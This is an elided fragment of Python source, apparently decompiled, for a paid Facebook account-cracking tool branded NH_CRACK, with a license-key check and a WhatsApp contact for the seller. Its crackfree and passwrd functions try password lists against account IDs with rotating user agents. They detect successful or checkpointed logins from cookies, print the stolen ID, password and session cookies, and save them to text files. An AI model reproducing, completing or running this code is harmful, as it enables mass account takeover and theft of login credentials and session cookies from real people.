...
def notice():
	...
	print('\n\x1b[0;91mPLEASE BUY NH_GREEN TOOL ')
	print('\x1b[0;93mSENT THIS KEY TO ADMIN >> %s%s' % (G, basesplit))
	print('\x1b[0;92mADMIN WHATSAPP\x1aNH_NAYEM')
	time.sleep(2)
	os.system('am start https://wa.me/+8801405193528')
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Nayem024').text
			if basesplit in plr:
				key = basesplit
				stat = '\x1b[0;92mPAID'
				FY = '\x1b[0;93m'
...
def passwrd():
	...
	print('👉\x1b[1;92mYOUR OK ID SAVED: nh_ok.txt')
	print('👉\x1b[1;91mYOUR CP ID SAVED: nh_cp.txt')
	...
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mNH_CP🥀')
...
def crackfree(idf, pwv):
	global cp, ok, loop
	(sys.stdout.write(f"\r{b}NH_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mNH_OK💚')
				print(f"\x1b[1;92m[✓] USER ID	   : {idf}\n\x1b[1;92m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER COOKIES: ')
				print(f"\r{kuki}{N}")
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, 'NAYEM-KING  OK', **('title',)))
					ok += 1
				elif 'ya' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('NH_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					user = idf
					infoakun = ''
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys() or 'ya' in oprek:
				...
				if 'ya' in princp:
					...
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'NH_CP', **('title',)))
					open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'''[bold green][•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]NH_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
